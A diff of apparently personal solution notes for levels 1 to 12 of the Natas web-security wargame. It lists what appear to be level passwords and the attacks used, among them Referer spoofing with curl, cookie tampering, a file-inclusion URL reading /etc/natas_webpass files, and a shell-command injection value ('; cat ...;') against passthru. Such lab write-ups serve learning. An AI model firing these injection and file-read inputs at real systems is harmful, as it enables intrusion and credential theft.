@@ -1,0 +1,84 @@
+* 1: gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+* 2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+go to URL/files
+users.txt will have the password
+
+* 3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+websites have URL/robots.txt so that google can find it
+go to URL/s3cr3t
+
+* 4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+
+go to natas5 
+copy the button in natas 4, inspect element and add it to natas5
+click it
+
+curl -e http://natas5.natas.labs.overthewire.org/ -u natas4 http://natas4.natas.labs.overthewire.org/index.php
+
+dash e is referal. 
+
+* 5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+Cookies. curl -i -u natas5 http://natas5.natas.labs.overthewire.org/
+
+document.cookie="loggedin=1"
+look at the memory side of console 
+
+* 6: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+go to URL/includes/secret.inc
+$_POST gets information through http headers. 
+$_GET gets information through URLS
+
+* 7: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+* 8: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+var_dump(base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362"))));
+
+* 9: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+; cat /etc/natas_webpass/natas10; 
+passthru will run bash code
+
+* 10: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+; = %3B
+& = %26
+
+passthru("grep -i $key dictionary.txt");
+
+"-F '' /etc/natas_webpass/natas11" 
+
+       -F, --fixed-strings
+Interpret PATTERN as a list of fixed strings (instead of 
+regular expressions), separated by newlines, any of which is to be 
+matched.
+
+
+       -E, --extended-regexp
+  Interpret PATTERN as an extended regular expression (ERE, see below).
+
+
+* 11: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+If i change 
+$partialKey .= $text2[$i] ^ 'f';
+into 
+$partialKey .= $text1[$i] ^ '0';
+
+it still works.
+
+w8Jqw8
+is the output. So
+
+qw8J is the XOR key!! Any cyclic permutation of Jqw8
+
+* 12: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
